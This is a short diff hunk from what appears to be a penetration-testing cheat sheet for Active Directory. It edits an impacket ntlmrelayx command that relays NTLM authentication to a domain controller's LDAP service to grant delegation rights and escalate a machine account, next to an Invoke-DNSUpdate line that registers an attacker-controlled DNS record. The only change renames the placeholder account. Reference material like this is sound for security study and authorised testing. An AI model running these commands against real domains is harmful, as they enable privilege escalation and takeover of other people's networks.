@@ -458,7 +458,7 @@ Invoke-DNSUpdate -DNSType A -DNSName attacker.<DOMAIN> -DNSData <IP ATTACKING MA
 
 #### Serve image with impacket
 ```
-ntlmrelayx.py -t ldap://<DC FQDN> --delegate-access -escalate-user machine$ --serve-image ./image.jpg
+ntlmrelayx.py -t ldap://<DC FQDN> --delegate-access -escalate-user FAKE01$ --serve-image ./image.jpg
 ```
 
 #### Change lockscreen image
